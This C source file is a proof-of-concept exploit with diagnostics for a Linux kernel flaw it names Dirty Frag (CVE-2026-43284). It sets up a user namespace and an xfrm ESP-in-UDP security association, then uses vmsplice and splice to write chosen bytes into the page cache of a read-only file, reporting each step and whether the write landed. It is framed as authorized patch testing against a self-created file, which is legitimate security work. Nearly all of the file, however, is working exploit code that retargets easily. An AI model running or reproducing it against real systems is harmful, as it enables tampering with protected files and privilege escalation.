// Enhanced Dirty Frag (CVE-2026-43284 / xfrm-ESP) PoC + diagnostic.
//
// Authorized defensive testing only. Targets /tmp/target.bin (created here).
//
// What this version does beyond the previous one: it instruments every step
// of the exploit so when the STORE doesn't land we can see why. Specifically:
//
//   Phase 1 (reachability)
//     - uname()                              -> compare kernel against patch
//     - module_loaded(esp4/esp6/...)         -> kernel-side ESP handler
//     - /proc/crypto                         -> verify authencesn(hmac(sha256),
//                                               cbc(aes)) primitives present
//     - per-flag unshare                     -> sandbox shape
//
//   Phase 2 (target file)
//     - create + fsync + prime page cache
//
//   Phase 3 (exploit attempt, child process)
//     - unshare USER|NET, map uid/gid, ifup lo (each verified, errno printed)
//     - register XFRM SA (full netlink response printed)
//     - immediately XFRM_MSG_GETSA the same SPI to confirm SA persisted
//     - open UDP encap recv socket, set UDP_ENCAP_ESPINUDP (verify)
//     - vmsplice + splice + splice (each return value reported)
//     - poll() on the recv socket with timeout: if POLLIN fires, the kernel
//       did NOT route the packet through xfrm_input (meaning xfrm encap
//       interception silently failed); if it times out the packet was
//       consumed by the xfrm path (good)
//
//   Phase 4 (verify)
//     - read first 16 bytes of target.bin via cached path; report change
//     - if bytes did NOT change but reachability + SA + delivery all looked
//       good, the most likely remaining cause is the kernel patch
//
// Build:  gcc -O0 -Wall -o /tmp/dirtyfrag_min dirtyfrag_min.c
// Run:    /tmp/dirtyfrag_min

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <net/if.h>
#include <netinet/in.h>
#include <poll.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif

#define PAGE        4096
#define ENC_PORT    4500
#define SEQ_VAL     200
#define REPLAY_SEQ  100
#define TARGET      "/tmp/target.bin"
#define SPI_VAL     0xDEADBE10u
#define PATCH_OFF   0
#define PATCH_SEQHI 0x42424242u   // bytes to plant: "BBBB"

// ---------- helpers ----------

static const char *cat(const char *path, char *buf, size_t buflen) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        snprintf(buf, buflen, "<unreadable: %s>", strerror(errno));
        return buf;
    }
    ssize_t n = read(fd, buf, buflen - 1);
    close(fd);
    if (n < 0) { snprintf(buf, buflen, "<read err>"); return buf; }
    buf[n] = 0;
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == ' ')) buf[--n] = 0;
    return buf;
}

static bool module_loaded(const char *name) {
    char path[256];
    snprintf(path, sizeof(path), "/sys/module/%s", name);
    struct stat st;
    if (stat(path, &st) == 0) return true;
    FILE *fp = fopen("/proc/modules", "r");
    if (!fp) return false;
    char line[512];
    size_t namelen = strlen(name);
    bool found = false;
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, name, namelen) == 0 && line[namelen] == ' ') {
            found = true; break;
        }
    }
    fclose(fp);
    return found;
}

// True if /proc/crypto has a "name : <name>" entry.
static bool crypto_has(const char *name) {
    FILE *fp = fopen("/proc/crypto", "r");
    if (!fp) return false;
    char line[512];
    size_t namelen = strlen(name);
    bool found = false;
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "name", 4) != 0) continue;
        char *colon = strchr(line, ':');
        if (!colon) continue;
        char *v = colon + 1;
        while (*v == ' ' || *v == '\t') v++;
        if (strncmp(v, name, namelen) == 0) {
            char c = v[namelen];
            if (c == 0 || c == '\n' || c == ' ' || c == '\t') {
                found = true; break;
            }
        }
    }
    fclose(fp);
    return found;
}

static int write_proc(const char *path, const char *buf) {
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    int n = write(fd, buf, strlen(buf));
    close(fd);
    return n;
}

static void put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len) {
    struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len  = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static void section(const char *title) {
    printf("\n");
    for (int i = 0; i < 72; i++) putchar('=');
    printf("\n%s\n", title);
    for (int i = 0; i < 72; i++) putchar('=');
    printf("\n");
}

// ---------- Phase 1: reachability ----------

static void phase1_reachability(void) {
    section("Phase 1 -- reachability");

    struct utsname u;
    if (uname(&u) == 0) {
        printf("  Kernel:    %s %s %s\n", u.sysname, u.release, u.version);
    } else {
        printf("  uname() failed: %s\n", strerror(errno));
    }
    printf("  Patch ref: mainline f4c50a4034e6 (CVE-2026-43284 fix, 2026-05-08)\n");
    printf("  Module presence on node:\n");
    printf("    esp4.ko:    %s\n", module_loaded("esp4")    ? "loaded" : "ABSENT");
    printf("    esp6.ko:    %s\n", module_loaded("esp6")    ? "loaded" : "ABSENT");
    printf("    rxrpc.ko:   %s\n", module_loaded("rxrpc")   ? "loaded" : "ABSENT");
    printf("    xfrm_user:  %s\n", module_loaded("xfrm_user") ? "loaded" : "ABSENT");

    printf("  Crypto primitives in /proc/crypto:\n");
    printf("    authencesn(hmac(sha256),cbc(aes)):  %s\n",
           crypto_has("authencesn(hmac(sha256),cbc(aes))") ? "yes" : "no");
    printf("    authenc(hmac(sha256),cbc(aes)):     %s\n",
           crypto_has("authenc(hmac(sha256),cbc(aes))") ? "yes" : "no");
    printf("    hmac(sha256):                       %s\n",
           crypto_has("hmac(sha256)") ? "yes" : "no");
    printf("    cbc(aes):                           %s\n",
           crypto_has("cbc(aes)") ? "yes" : "no");

    char buf[8192];
    cat("/proc/self/status", buf, sizeof(buf));
    char seccomp[32] = "?", capeff[32] = "?";
    char *p;
    if ((p = strstr(buf, "Seccomp:"))) sscanf(p, "Seccomp: %31s", seccomp);
    if ((p = strstr(buf, "CapEff:")))  sscanf(p, "CapEff: %31s", capeff);
    printf("  Sandbox shape:\n");
    printf("    Seccomp:    %s  (0=disabled  1=strict  2=filter)\n", seccomp);
    printf("    CapEff:     %s  (0 = no caps)\n", capeff);
    printf("    SELinux:    %s\n", cat("/proc/self/attr/current", buf, sizeof(buf)));
    printf("    max_user_namespaces: %s\n",
           cat("/proc/sys/user/max_user_namespaces", buf, sizeof(buf)));
}

// ---------- Phase 2: target file ----------

static int phase2_prepare_target(void) {
    section("Phase 2 -- prepare target file");
    unsigned char *a;
    if (posix_memalign((void **)&a, PAGE, PAGE)) { perror("memalign"); return -1; }
    memset(a, 'A', PAGE);
    int fd = open(TARGET, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { perror("open create"); free(a); return -1; }
    if (write(fd, a, PAGE) != PAGE) { perror("write"); close(fd); free(a); return -1; }
    fsync(fd);
    close(fd);
    fd = open(TARGET, O_RDONLY);
    read(fd, a, PAGE);  // prime cache
    close(fd);
    free(a);
    printf("  Wrote 'A' * %d to %s, fsynced, primed cache.\n", PAGE, TARGET);
    return 0;
}

// ---------- Phase 3: exploit attempt with diagnostics ----------

static int setup_userns_netns_v(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        printf("    unshare(USER|NET): FAILED  %s\n", strerror(errno));
        return -1;
    }
    printf("    unshare(USER|NET):  OK\n");
    if (write_proc("/proc/self/setgroups", "deny") < 0) {
        printf("    setgroups deny:     FAILED  %s\n", strerror(errno));
        return -1;
    }
    char map[64];
    snprintf(map, sizeof(map), "0 %u 1", uid);
    if (write_proc("/proc/self/uid_map", map) < 0) {
        printf("    uid_map:            FAILED  %s\n", strerror(errno));
        return -1;
    }
    snprintf(map, sizeof(map), "0 %u 1", gid);
    if (write_proc("/proc/self/gid_map", map) < 0) {
        printf("    gid_map:            FAILED  %s\n", strerror(errno));
        return -1;
    }
    printf("    uid/gid maps:       OK (0 %u 1)\n", uid);

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) { printf("    socket for ifreq: FAILED  %s\n", strerror(errno)); return -1; }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) {
        printf("    SIOCGIFFLAGS lo:    FAILED  %s\n", strerror(errno));
        close(s); return -1;
    }
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) {
        printf("    SIOCSIFFLAGS lo:    FAILED  %s\n", strerror(errno));
        close(s); return -1;
    }
    close(s);
    printf("    lo brought UP:      OK\n");
    return 0;
}

static int add_xfrm_sa_v(uint32_t spi, uint32_t patch_seqhi) {
    int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (sk < 0) { printf("    netlink socket:     FAILED  %s\n", strerror(errno)); return -1; }
    struct sockaddr_nl nl = { .nl_family = AF_NETLINK };
    if (bind(sk, (struct sockaddr *)&nl, sizeof(nl)) < 0) {
        printf("    netlink bind:       FAILED  %s\n", strerror(errno));
        close(sk); return -1;
    }

    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_type  = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_pid   = getpid();
    nlh->nlmsg_seq   = 1;
    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

    struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
    xs->id.daddr.a4   = inet_addr("127.0.0.1");
    xs->id.spi        = htonl(spi);
    xs->id.proto      = IPPROTO_ESP;
    xs->saddr.a4      = inet_addr("127.0.0.1");
    xs->family        = AF_INET;
    xs->mode          = XFRM_MODE_TRANSPORT;
    xs->reqid         = 0x1234;
    xs->flags         = XFRM_STATE_ESN;
    xs->lft.soft_byte_limit   = (uint64_t)-1;
    xs->lft.hard_byte_limit   = (uint64_t)-1;
    xs->lft.soft_packet_limit = (uint64_t)-1;
    xs->lft.hard_packet_limit = (uint64_t)-1;
    xs->sel.family = AF_INET;
    xs->sel.prefixlen_d = 32;
    xs->sel.prefixlen_s = 32;
    xs->sel.daddr.a4 = inet_addr("127.0.0.1");
    xs->sel.saddr.a4 = inet_addr("127.0.0.1");

    {
        char ab[sizeof(struct xfrm_algo_auth) + 32] = {0};
        struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *)ab;
        strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name) - 1);
        aa->alg_key_len = 32 * 8;
        aa->alg_trunc_len = 128;
        memset(aa->alg_key, 0xAA, 32);
        put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, ab, sizeof(ab));
    }
    {
        char eb[sizeof(struct xfrm_algo) + 16] = {0};
        struct xfrm_algo *ea = (struct xfrm_algo *)eb;
        strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name) - 1);
        ea->alg_key_len = 16 * 8;
        memset(ea->alg_key, 0xBB, 16);
        put_attr(nlh, XFRMA_ALG_CRYPT, eb, sizeof(eb));
    }
    {
        struct xfrm_encap_tmpl enc = {0};
        enc.encap_type  = UDP_ENCAP_ESPINUDP;
        enc.encap_sport = htons(ENC_PORT);
        enc.encap_dport = htons(ENC_PORT);
        put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
    }
    {
        char esnb[sizeof(struct xfrm_replay_state_esn) + 4] = {0};
        struct xfrm_replay_state_esn *esn = (struct xfrm_replay_state_esn *)esnb;
        esn->bmp_len = 1;
        esn->seq = REPLAY_SEQ;
        esn->seq_hi = patch_seqhi;
        esn->replay_window = 32;
        put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esnb, sizeof(esnb));
    }

    if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) {
        printf("    XFRM_MSG_NEWSA send: FAILED  %s\n", strerror(errno));
        close(sk); return -1;
    }
    char rb[4096];
    int n = recv(sk, rb, sizeof(rb), 0);
    if (n < 0) {
        printf("    XFRM_MSG_NEWSA recv: FAILED  %s\n", strerror(errno));
        close(sk); return -1;
    }
    struct nlmsghdr *rh = (struct nlmsghdr *)rb;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = NLMSG_DATA(rh);
        if (e->error) {
            printf("    XFRM_MSG_NEWSA:     KERNEL REJECTED  %s\n",
                   strerror(-e->error));
            close(sk); return -1;
        }
    }
    printf("    XFRM_MSG_NEWSA:     OK (kernel ACK'd, spi=0x%08x)\n", spi);
    close(sk);
    return 0;
}

// Use XFRM_MSG_GETSA to confirm the SA we just installed is queryable.
static int verify_sa_present(uint32_t spi) {
    int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (sk < 0) { printf("    SA verify socket:   FAILED  %s\n", strerror(errno)); return -1; }
    struct sockaddr_nl nl = { .nl_family = AF_NETLINK };
    bind(sk, (struct sockaddr *)&nl, sizeof(nl));

    char buf[1024] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_type  = XFRM_MSG_GETSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_pid   = getpid();
    nlh->nlmsg_seq   = 2;
    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_id));
    struct xfrm_usersa_id *uid = (struct xfrm_usersa_id *)NLMSG_DATA(nlh);
    uid->daddr.a4 = inet_addr("127.0.0.1");
    uid->spi      = htonl(spi);
    uid->family   = AF_INET;
    uid->proto    = IPPROTO_ESP;

    if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) {
        printf("    SA verify send:     FAILED  %s\n", strerror(errno));
        close(sk); return -1;
    }
    char rb[4096];
    int n = recv(sk, rb, sizeof(rb), 0);
    close(sk);
    if (n < 0) {
        printf("    SA verify recv:     FAILED  %s\n", strerror(errno));
        return -1;
    }
    struct nlmsghdr *rh = (struct nlmsghdr *)rb;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = NLMSG_DATA(rh);
        if (e->error) {
            printf("    SA verify:          NOT FOUND  %s\n", strerror(-e->error));
            return -1;
        }
    }
    if (rh->nlmsg_type == XFRM_MSG_NEWSA) {
        printf("    SA verify:          OK (SPI 0x%08x is registered)\n", spi);
        return 0;
    }
    printf("    SA verify:          unexpected nlmsg_type=%d\n", rh->nlmsg_type);
    return -1;
}

// Returns:  1 if a packet arrived on sk_recv during the wait (xfrm did NOT
//           intercept; the packet was treated as plain UDP)
//           0 if no packet arrived (xfrm consumed it OR packet was dropped)
//          -1 on poll error
static int poll_recv_socket(int fd, int timeout_ms) {
    struct pollfd pfd = { .fd = fd, .events = POLLIN };
    int r = poll(&pfd, 1, timeout_ms);
    if (r < 0) return -1;
    return r > 0 && (pfd.revents & POLLIN) ? 1 : 0;
}

static int do_one_write_v(const char *path, off_t offset, uint32_t spi) {
    int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_recv < 0) { printf("    sk_recv:            FAILED  %s\n", strerror(errno)); return -1; }
    int one = 1;
    setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa = {
        .sin_family = AF_INET,
        .sin_port   = htons(ENC_PORT),
        .sin_addr   = { inet_addr("127.0.0.1") },
    };
    if (bind(sk_recv, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        printf("    sk_recv bind:       FAILED  %s\n", strerror(errno));
        close(sk_recv); return -1;
    }
    int encap = UDP_ENCAP_ESPINUDP;
    if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
        printf("    UDP_ENCAP:          FAILED  %s  <-- xfrm encap interception will not engage\n",
               strerror(errno));
        close(sk_recv); return -1;
    }
    printf("    sk_recv + UDP_ENCAP_ESPINUDP: OK\n");

    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { printf("    sk_send:            FAILED\n"); close(sk_recv); return -1; }
    if (connect(sk_send, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        printf("    sk_send connect:    FAILED  %s\n", strerror(errno));
        close(sk_send); close(sk_recv); return -1;
    }
    printf("    sk_send connect:    OK\n");

    int file_fd = open(path, O_RDONLY);
    if (file_fd < 0) { printf("    open target:        FAILED  %s\n", strerror(errno));
        close(sk_send); close(sk_recv); return -1; }
    int pfd[2];
    if (pipe(pfd) < 0) { printf("    pipe:               FAILED\n");
        close(file_fd); close(sk_send); close(sk_recv); return -1; }

    uint8_t hdr[24];
    *(uint32_t *)(hdr + 0) = htonl(spi);
    *(uint32_t *)(hdr + 4) = htonl(SEQ_VAL);
    memset(hdr + 8, 0xCC, 16);

    struct iovec iov = { .iov_base = hdr, .iov_len = sizeof(hdr) };
    ssize_t r1 = vmsplice(pfd[1], &iov, 1, 0);
    printf("    vmsplice header:    %zd / 24 bytes\n", r1);
    if (r1 != (ssize_t)sizeof(hdr)) goto fail;

    off_t off = offset;
    ssize_t r2 = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
    printf("    splice file->pipe:  %zd / 16 bytes (offset=%lld)\n", r2, (long long)offset);
    if (r2 != 16) goto fail;

    ssize_t r3 = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
    printf("    splice pipe->sock:  %zd / 40 bytes\n", r3);

    int got = poll_recv_socket(sk_recv, 200);
    if (got == 1) {
        printf("    sk_recv POLLIN:     YES  <-- packet bypassed xfrm encap (treated as plain UDP)\n");
        char drain[64]; recv(sk_recv, drain, sizeof(drain), 0);
    } else if (got == 0) {
        printf("    sk_recv POLLIN:     no   (packet was consumed before reaching UDP queue --\n"
               "                              expected when xfrm encap engaged)\n");
    } else {
        printf("    sk_recv poll error: %s\n", strerror(errno));
    }

    close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv);
    return 0;
fail:
    close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv);
    return -1;
}

static int phase3_exploit(void) {
    section("Phase 3 -- exploit attempt (in child process / new userns)");
    pid_t pid = fork();
    if (pid < 0) { perror("fork"); return -1; }
    if (pid == 0) {
        if (setup_userns_netns_v() < 0) _exit(2);
        if (add_xfrm_sa_v(SPI_VAL, PATCH_SEQHI) < 0) _exit(3);
        verify_sa_present(SPI_VAL);  // non-fatal, informational
        if (do_one_write_v(TARGET, PATCH_OFF, SPI_VAL) < 0) _exit(4);
        _exit(0);
    }
    int st;
    waitpid(pid, &st, 0);
    if (!WIFEXITED(st)) { printf("  child died abnormally\n"); return -1; }
    int rc = WEXITSTATUS(st);
    printf("  child exited with %d", rc);
    if (rc == 0) printf(" (all steps reported success)\n");
    else {
        const char *names[] = { "ok", "fork", "userns/netns setup",
                                "xfrm SA registration", "splice trigger" };
        if (rc >= 1 && rc <= 4) printf(" -- failed at: %s\n", names[rc]);
        else printf("\n");
    }
    return rc;
}

// ---------- Phase 4: verify ----------

static void phase4_verify(int child_rc) {
    section("Phase 4 -- verify target file");
    unsigned char buf[16];
    int fd = open(TARGET, O_RDONLY);
    if (fd < 0) { perror("verify open"); return; }
    int n = read(fd, buf, 16);
    close(fd);
    if (n != 16) { perror("verify read"); return; }
    printf("  First 16 bytes (cached read): ");
    for (int i = 0; i < 16; i++) printf("%02x ", buf[i]);
    putchar('\n');

    bool landed = (buf[0] == 0x42 && buf[1] == 0x42 && buf[2] == 0x42 && buf[3] == 0x42);
    if (landed) {
        printf("\n  RESULT: LANDED -- bytes 0..3 are 0x42 (BBBB)\n");
        printf("    The Dirty Frag (CVE-2026-43284) primitive succeeded on this kernel.\n");
        printf("    Confirm divergence by running the multi-method reader on %s --\n", TARGET);
        printf("    cached should show BBBB, O_DIRECT should still show AAAA.\n");
        return;
    }

    printf("\n  RESULT: NOT LANDED -- bytes 0..3 are still 0x41 (AAAA)\n");
    printf("\n  Inferring most likely cause from the diagnostics above:\n");
    if (child_rc != 0) {
        printf("    * The exploit did not complete all steps (child rc=%d). See Phase 3.\n", child_rc);
        return;
    }
    printf("    * Phase 3 reported every step succeeded (unshare, SA, SA verify, splice).\n");
    printf("    * If sk_recv POLLIN was 'no', the packet WAS consumed by the xfrm path,\n");
    printf("      meaning esp_input() ran -- but did not write to the page cache.\n");
    printf("      Most likely cause: KERNEL PATCHED. Commit f4c50a4034e6 routes\n");
    printf("      shared-frag skbs through skb_cow_data(), bypassing the in-place\n");
    printf("      crypto write that constituted the bug primitive. Run `uname -r`\n");
    printf("      and check the node OS for the patch.\n");
    printf("    * If sk_recv POLLIN was 'YES', xfrm encap interception did NOT engage.\n");
    printf("      Possible causes: UDP encap socket option silently no-op'd,\n");
    printf("      conntrack/netfilter rerouting, or the SA's encap template not\n");
    printf("      matching the packet's port pair.\n");
    printf("    * If SA verify said NOT FOUND, the SA registration silently failed.\n");
    printf("      Check XFRMA_ALG_AUTH_TRUNC alg_trunc_len value and crypto_has() above.\n");
}

// ---------- main ----------

int main(void) {
    printf("Dirty Frag (CVE-2026-43284) PoC + diagnostic against %s\n", TARGET);
    printf("Authorized defensive testing only -- targets a self-owned file.\n");

    phase1_reachability();

    if (phase2_prepare_target() < 0) return 1;

    int rc = phase3_exploit();

    phase4_verify(rc);
    return 0;
}
